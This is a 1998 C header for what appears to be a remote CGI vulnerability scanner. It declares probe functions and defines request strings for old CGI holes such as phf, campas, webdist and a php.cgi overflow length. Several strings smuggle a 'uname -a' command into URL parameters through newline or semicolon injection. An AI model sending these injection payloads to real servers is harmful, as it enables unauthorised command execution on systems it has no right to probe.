/*

cgi.h

Author: Liraz Siri <liraz@bigfoot.com>

Copyright (c) 1998 Liraz Siri <liraz@bigfoot.com>, Ariel, Israel
                   All rights reserved

Created: Sat Sep 12 01:19:21 IST 1998

Code for all the CGI hook functions over in cgihooks.h.

*/

#define WEBPORT		80
/* CGI constants, headers, timeouts. The assorted bunch. */

#define CGI_HTTP_HEADER_10   "HTTP/1.0 200 "
#define CGI_HTTP_HEADER_11   "HTTP/1.1 200 "

#define CGI_TEMPLATE	"GET /cgi-bin/%s HTTP/1.0\n\n"
#define CGI_HEADER_LEN		6
#define CGI_WRITE_TIMEOUT	10
#define CGI_MAX_RESPONSE_SIZE	1024
#define CGI_REQUEST_LEN		256
#define CGI_DEFAULT_MAX_LINES	25

#define WWWCOUNT_IMMUNE_VERSION         "2.4"
#define WWWCOUNT_REQUEST                "Count.cgi" /* X */
#define WWWCOUNT_LINES			4

#define PHF_REQUEST 			"phf?QAlias=x%0auname%20%2da" /* X */
#define PHF_MARK			"/usr/local/bin/ph -m  Alias=x"
#define PHF_LINES			10

#define CAMPAS_REQUEST			"campas?%0auname%20%2da" 
#define EWS_REQUEST			"ews/ews/architext_query.pl" 
#define FAXSURVEY_REQUEST		"faxsurvey?uname%20%2da" 
#define GLIMPSE_REQUEST			"glimpse" 
#define HANDLER_REQUEST			"handler/useless_shit;uname%20%2da?data=Download"
#define INFO2WWW_REQUEST		"info2www"
#define WEBDIST_REQUEST			"webdist.cgi?distloc=;uname%20%2da"
#define WEBGAIS_REQUEST			"webgais"
#define WEBSENDMAIL_REQUEST		"websendmail"
#define PHP_REQUEST			"php.cgi?"


/*-- note that PHP_REQUEST_LEN has nothing to do with the length of 
     PHP_REQUEST --*/
#define PHP_OVERFLOW_LEN		1023
#define PHP_REQUEST_LEN			2048

/* general cgi handler. We return -1 on failure and set errno = EBADRQC
   if the cgi script requested is not present. tconnect/twrite/network_gets 
   will set thier own errno on failure and these can be handled at a higher 
   level, as cgi_makerequest does not tamper with thier failure codes in any 
   way. note that we allocate memory for response only if *response is
   handed out with the value of NULL. From the server we get a response
   of maximum max_response_size bytes, and max_response_lines lines. */ 
int cgi_makerequest(char *request, char **response, int max_response_size,
		    int max_response_lines, struct sockaddr_in *addr, 
                    int timer);

/*      cgi_exec_uname() sends a request (the request argument) which is
 *      supposed to try and trick the web server into running
 *      uname(1). Ussually, if a program is executed by a CGI, it's output
 *      will be to the CGI's stdout, and will show up in it's response, which
 *      we will check for anything that looks like it's coming from `uname`
 *      (we strstr(3) for OS names).

 *      We return 1 if uname output was detected, 0 when it is non detected,
 *      and -1 on an error. We need the 'cgi_alias' argument because we take
 *      care of logging by ourself.
*/

int cgi_exec_uname(char *cgi_alias, char *request, struct sockaddr_in *addr,
		   char *host, int timer);

/* This routine will attempt to assert wether or not a CGI is present
   on a remote web server. It takes care of it's OWN non-error logging,
   and should be called by hooks that don't/can't get a execution output
   (Ie. output from a program like uname/cat etc.), as a milder
   alternative to cgi_exec_uname */
int cgi_evaluate_potential(char *cgi_alias, char *request, 
			   struct sockaddr_in *addr, char *host, int timer);

/*-- CGI... HO HOO HOOKS... SECTION --*/
/* Several general rules apply to all the cgi hooks. On success every
   cgi should handle it's own log of the vulnerability. On any substantial
   error the cgi hook should set the apropriate errno, and return -1.
   Errors will be handled by the web_logger routine at a higher level */

int cgi_wwwcount_handlehost(struct sockaddr_in *addr, char *host, int timer);
int cgi_webdist_handlehost(struct sockaddr_in *addr, char *host, int timer);
int cgi_phf_handlehost(struct sockaddr_in *addr, char *host, int timer);
int cgi_php_handlehost(struct sockaddr_in *addr, char *host, int timer);
int cgi_ews_handlehost(struct sockaddr_in *addr, char *host, int timer);
int cgi_campas_handlehost(struct sockaddr_in *addr, char *host, int timer);
int cgi_faxsurvey_handlehost(struct sockaddr_in *addr, char *host, int timer);
int cgi_glimpse_handlehost(struct sockaddr_in *addr, char *host, int timer);
int cgi_handler_handlehost(struct sockaddr_in *addr, char *host, int timer);
int cgi_webgais_handlehost(struct sockaddr_in *addr, char *host, int timer);
int cgi_info2www_handlehost(struct sockaddr_in *addr, char *host, int timer);
int cgi_websendmail_handlehost(struct sockaddr_in *addr, char *host, int timer);
